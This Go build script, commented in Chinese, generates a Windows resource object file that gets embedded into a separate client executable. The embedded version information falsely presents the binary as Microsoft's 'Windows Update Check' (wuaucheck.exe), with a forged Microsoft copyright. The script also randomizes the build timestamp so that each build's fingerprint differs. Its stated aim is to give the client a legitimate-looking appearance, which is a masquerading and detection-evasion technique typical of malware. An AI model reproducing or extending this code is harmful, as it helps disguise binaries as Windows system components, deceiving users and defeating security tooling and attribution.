//go:build ignore

// 生成 resource.syso:一个包含版本信息(VS_VERSION_INFO)、应用清单与图标的
// COFF 目标文件,由 go build 自动嵌入客户端 exe,使二进制具备完整合法软件外观。
//
// 背景:本机无网络且未安装 goversioninfo,rc.exe+cvtres 生成的 .syso 与 Go
// 链接器不兼容("sectnum < 0!")。本生成器直接产出 Go 链接器期望的格式
// (cmd/link/internal/loadpe/ldpe.go + internal/ld/pe.go addpersrc):
//   - 单个节,名称 ".rsrc"(不能是 ".rsrc$xx",否则链接器按拆分节处理并
//     错误地额外加上节长度);
//   - 目录条目指针为相对资源根目录的偏移(Windows 加载器语义),普通数据;
//   - 每个 IMAGE_RESOURCE_DATA_ENTRY.OffsetToData 位置附带一个
//     IMAGE_REL_AMD64_ADDR32(0x0002)COFF 重定位,数据处存放节内相对偏移
//     作为加数,链接时 addpersrc 改写为 ".rsrc 节虚拟地址 + 加数"(绝对 RVA);
//   - 一个静态节符号(StorageClass=3)作为重定位目标,Value=0。
//
// 元数据与 app.manifest 的版本标识保持一致;修改版本信息时注意两处同步。
// 运行: go run gen_resources.go
package main

import (
	"bytes"
	"encoding/binary"
	"math/rand"
	"os"
	"sort"
	"time"
	"unicode/utf16"
)

// ---------- 资源树序列化 ----------

type coffBuilder struct {
	data   []byte
	relocs []uint32 // 节内偏移:需要 RVA 重定位的 4 字节指针位置
	fixups []dirFixup
}

// resDir/resData 描述资源树;根目录必须位于节偏移 0(PE 数据目录指向节首),
// 故按"先父后子"的顺序自上而下写入,条目指针在子节点构建完成后回填。
type resDirEntry struct {
	id       uint32
	child    *resDir
	data     *resData
	childOff uint32 // 构建后回填
	dataOff  uint32
}

type resDir struct{ entries []resDirEntry }
type resData struct{ blob []byte }

type dirFixup struct {
	pos int
	e   *resDirEntry
}

func (b *coffBuilder) u16(v uint16) {
	b.data = append(b.data, byte(v), byte(v>>8))
}

func (b *coffBuilder) u32(v uint32) {
	b.data = append(b.data, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

// u32rel 写入 4 字节值并登记一个 RVA 重定位(链接器将以 节虚拟地址+加数 覆盖)
func (b *coffBuilder) u32rel(v uint32) {
	off := uint32(len(b.data))
	b.u32(v)
	b.relocs = append(b.relocs, off)
}

func (b *coffBuilder) align4() {
	for len(b.data)%4 != 0 {
		b.data = append(b.data, 0)
	}
}

// dir 输出 IMAGE_RESOURCE_DIRECTORY(16B)+条目(每项 8B),返回其节内偏移。
// 条目 OffsetToData 是相对资源根目录的偏移(Windows 加载器语义,与 cmd.exe 等
// 系统二进制一致),普通数据、无需重定位;仅 DATA_ENTRY.OffsetToData 为绝对 RVA,
// 由链接器 addpersrc 通过 IMAGE_REL_AMD64_ADDR32 重定位补丁。
func (b *coffBuilder) dir(d *resDir) uint32 {
	b.align4()
	off := uint32(len(b.data))
	b.u32(0) // Characteristics
	b.u32(0) // TimeDateStamp
	b.u16(0) // MajorVersion
	b.u16(0) // MinorVersion
	b.u16(0) // NumberOfNamedEntries
	b.u16(uint16(len(d.entries)))
	for i := range d.entries {
		e := &d.entries[i]
		b.u32(e.id)
		pos := uint32(len(b.data))
		b.u32(0) // 占位,回填 0x80000000|childOff 或 dataOff(均为根目录相对偏移)
		b.fixups = append(b.fixups, dirFixup{int(pos), e})
	}
	for i := range d.entries {
		e := &d.entries[i]
		if e.child != nil {
			e.childOff = b.dir(e.child)
		} else {
			e.dataOff = b.dataEntry(e.data.blob)
		}
	}
	return off
}

// dataEntry 输出 IMAGE_RESOURCE_DATA_ENTRY(16B)+数据,返回其节内偏移。
// OffsetToData 为绝对 RVA:存节内偏移作加数并登记 ADDR32 重定位,
// 链接器改写为 ".rsrc 节虚拟地址 + 加数"。
func (b *coffBuilder) dataEntry(blob []byte) uint32 {
	b.align4()
	off := uint32(len(b.data))
	b.u32rel(off + 16)       // OffsetToData → 数据紧跟 16B 头之后(加数=数据偏移)
	b.u32(uint32(len(blob))) // Size
	b.u32(0)                 // CodePage
	b.u32(0)                 // Reserved
	b.data = append(b.data, blob...)
	return off
}

// patch 回填目录条目指针:均为相对资源根目录的偏移,子目录带高位标志。
func (b *coffBuilder) patch() {
	for _, f := range b.fixups {
		var v uint32
		if f.e.child != nil {
			v = 0x80000000 | f.e.childOff
		} else {
			v = f.e.dataOff
		}
		binary.LittleEndian.PutUint32(b.data[f.pos:], v)
	}
	b.fixups = nil
}

// ---------- VS_VERSION_INFO ----------

func utf16z(s string) []byte {
	u := utf16.Encode([]rune(s))
	out := make([]byte, 0, len(u)*2+2)
	for _, r := range u {
		out = append(out, byte(r), byte(r>>8))
	}
	return append(out, 0, 0)
}

func pad4(p []byte) []byte {
	for len(p)%4 != 0 {
		p = append(p, 0)
	}
	return p
}

// versionNode 组装一个 VERSIONINFO 节点。按 PE 规范,key 紧跟在 6 字节头之后,
// key 与 value 之间补零使 value 对齐到 32 位边界(头部 6 字节本身不齐,
// 因此必须对 "头+key" 整体取 4 对齐);节点末尾再整体对齐,wLength 含结尾填充。
func versionNode(wValueLength, wType uint16, key string, value []byte, children ...[]byte) []byte {
	var b []byte
	b = append(b, 0, 0) // wLength 占位
	var tmp [2]byte
	binary.LittleEndian.PutUint16(tmp[:], wValueLength)
	b = append(b, tmp[:]...)
	binary.LittleEndian.PutUint16(tmp[:], wType)
	b = append(b, tmp[:]...)
	b = append(b, utf16z(key)...)
	for len(b)%4 != 0 {
		b = append(b, 0) // value 32 位对齐
	}
	b = append(b, value...)
	for _, c := range children {
		b = append(b, c...)
	}
	for len(b)%4 != 0 {
		b = append(b, 0) // 下一节点 32 位对齐
	}
	binary.LittleEndian.PutUint16(b[:2], uint16(len(b)))
	return b
}

func versionString(key, value string) []byte {
	v := utf16z(value)
	// String 节点 wValueLength 以字(UTF-16 单元)计,含结尾 NUL(与 rc.exe 输出一致)
	return versionNode(uint16(len(v)/2), 1, key, v)
}

func versionVar(key string, values ...uint16) []byte {
	var v []byte
	for _, x := range values {
		v = append(v, byte(x), byte(x>>8))
	}
	return versionNode(uint16(len(v)), 0, key, v)
}

func versionInfo() []byte {
	fixed := make([]byte, 52)
	le := binary.LittleEndian
	le.PutUint32(fixed[0:], 0xFEEF04BD)  // dwSignature
	le.PutUint32(fixed[4:], 0x00010000)  // dwStrucVersion
	le.PutUint32(fixed[8:], 0x000A0000)  // FileVersion MS = 10.0
	le.PutUint32(fixed[12:], 0x65F40001) // FileVersion LS = 26100.1
	le.PutUint32(fixed[16:], 0x000A0000) // ProductVersion MS
	le.PutUint32(fixed[20:], 0x65F40001) // ProductVersion LS
	le.PutUint32(fixed[24:], 0x3F)       // FileFlagsMask
	le.PutUint32(fixed[28:], 0)          // FileFlags
	le.PutUint32(fixed[32:], 0x00040004) // FileOS = VOS_NT_WINDOWS32
	le.PutUint32(fixed[36:], 1)          // FileType = VFT_APP
	le.PutUint32(fixed[40:], 0)          // FileSubtype
	le.PutUint32(fixed[44:], 0)          // FileDateMS
	le.PutUint32(fixed[48:], 0)          // FileDateLS

	kv := [][2]string{
		{"CompanyName", "Microsoft Corporation"},
		{"FileDescription", "Windows Update Check"},
		{"FileVersion", "10.0.26100.1"},
		{"InternalName", "wuaucheck"},
		{"LegalCopyright", "Microsoft Corporation. All rights reserved."},
		{"OriginalFilename", "wuaucheck.exe"},
		{"ProductName", "Microsoft Windows Operating System"},
		{"ProductVersion", "10.0.26100.1"},
	}
	var st []byte
	for _, p := range kv {
		st = append(st, versionString(p[0], p[1])...)
	}
	stringTable := versionNode(0, 1, "040904B0", nil, st)
	stringFileInfo := versionNode(0, 1, "StringFileInfo", nil, stringTable)
	varFileInfo := versionNode(0, 1, "VarFileInfo",
		versionVar("Translation", 0x0409, 0x04B0))
	// 根节点 wType=0(与 rc.exe 输出一致;String 节点为 1,Var 为 0)
	return versionNode(52, 0, "VS_VERSION_INFO", fixed, stringFileInfo, varFileInfo)
}

// ---------- 图标 ----------

// groupIconDir 由 PNG 图标负载生成 RT_GROUP_ICON 数据(GRPICONDIR)
func groupIconDir(w, h, bpp byte, png []byte, nID uint16) []byte {
	b := make([]byte, 20)
	b[0], b[1] = 0, 0 // wReserved
	b[2], b[3] = 1, 0 // wType = ICON
	b[4], b[5] = 1, 0 // wCount
	b[6] = w          // bWidth
	b[7] = h          // bHeight
	b[8] = 0          // bColorCount
	b[9] = 0          // bReserved
	b[10], b[11] = 1, 0
	b[12] = bpp
	binary.LittleEndian.PutUint32(b[14:], uint32(len(png))) // dwBytesInRes
	binary.LittleEndian.PutUint16(b[18:], nID)
	return b
}

// ---------- COFF 输出 ----------

func (b *coffBuilder) writeCOFF(path string) {
	sort.Slice(b.relocs, func(i, j int) bool { return b.relocs[i] < b.relocs[j] })

	rawSize := len(b.data)
	numRelocs := len(b.relocs)
	rawOff := 60                      // 20B 文件头 + 40B 节头
	relocOff := rawOff + rawSize      // 重定位表
	symOff := relocOff + numRelocs*10 // 符号表(1 个节符号)
	// 结尾附 4B 空字符串表(长度=4,debug/pe 要求读得到)

	out := new(bytes.Buffer)
	w := func(v ...interface{}) {
		for _, x := range v {
			if err := binary.Write(out, binary.LittleEndian, x); err != nil {
				panic(err)
			}
		}
	}
	// COFF 文件头(20B)
	w(uint16(0x8664), // Machine = AMD64
		uint16(1), // NumberOfSections
		uint32(time.Now().Unix()^int64(rand.Int31())), // TimeDateStamp 随机化,保持每次构建指纹不同
		uint32(symOff), // PointerToSymbolTable
		uint32(1),      // NumberOfSymbols
		uint16(0),      // SizeOfOptionalHeader
		uint16(0))      // Characteristics
	// 节头(40B)
	out.WriteString(".rsrc\x00\x00\x00") // 名称必须为 ".rsrc",非拆分节
	w(uint32(rawSize),                   // VirtualSize
		uint32(0),        // VirtualAddress
		uint32(rawSize),  // SizeOfRawData
		uint32(rawOff),   // PointerToRawData
		uint32(relocOff), // PointerToRelocations
		uint32(0),        // PointerToLinenumbers
		uint16(numRelocs),
		uint16(0),
		uint32(0x40000040)) // CNT_INITIALIZED_DATA | MEM_READ(不可 DISCARDABLE,否则链接器跳过重定位)
	out.Write(b.data)
	for _, off := range b.relocs {
		w(uint32(off), // VirtualAddress
			uint32(0),      // SymbolTableIndex → 节符号
			uint16(0x0002)) // IMAGE_REL_AMD64_ADDR32
	}
	// 节符号(18B):".rsrc" 静态符号,重定位目标
	out.WriteString(".rsrc\x00\x00\x00")
	w(uint32(0), // Value
		int16(1),  // SectionNumber
		uint16(0)) // Type
	out.WriteByte(3) // StorageClass = IMAGE_SYM_CLASS_STATIC(issect 判定条件)
	out.WriteByte(0) // NumberOfAuxSymbols
	w(uint32(4))     // 空字符串表长度

	if err := os.WriteFile(path, out.Bytes(), 0644); err != nil {
		panic(err)
	}
}

func main() {
	manifest, err := os.ReadFile("app.manifest")
	if err != nil {
		panic(err)
	}
	ico, err := os.ReadFile("icon.ico")
	if err != nil {
		panic(err)
	}
	if len(ico) < 22 || ico[2] != 1 || ico[3] != 0 {
		panic("icon.ico 格式异常")
	}
	w, h, bpp := ico[6], ico[7], ico[12]
	pngSize := binary.LittleEndian.Uint32(ico[14:])
	pngOff := binary.LittleEndian.Uint32(ico[18:])
	if int(pngOff)+int(pngSize) > len(ico) {
		panic("icon.ico PNG 负载越界")
	}
	png := ico[pngOff : pngOff+pngSize]

	b := &coffBuilder{}

	// 资源树:类型(3=ICON, 14=GROUP_ICON, 16=VERSION, 24=MANIFEST)
	// → 名称 → 语言(0x0409) → 数据。根目录必须位于节偏移 0。
	leaf := func(blob []byte) *resDir {
		return &resDir{entries: []resDirEntry{
			{id: 0x0409, data: &resData{blob}},
		}}
	}
	tree := &resDir{entries: []resDirEntry{
		{id: 3, child: &resDir{entries: []resDirEntry{
			{id: 2, child: leaf(png)},
		}}},
		{id: 14, child: &resDir{entries: []resDirEntry{
			{id: 2, child: leaf(groupIconDir(w, h, bpp, png, 2))},
		}}},
		{id: 16, child: &resDir{entries: []resDirEntry{
			{id: 1, child: leaf(versionInfo())},
		}}},
		{id: 24, child: &resDir{entries: []resDirEntry{
			{id: 1, child: leaf(manifest)},
		}}},
	}}
	if off := b.dir(tree); off != 0 {
		panic("根目录必须位于节偏移 0")
	}
	b.patch()

	b.writeCOFF("resource.syso")
	println("resource.syso 生成成功:", len(b.data), "B 数据,", len(b.relocs), "个重定位")
}
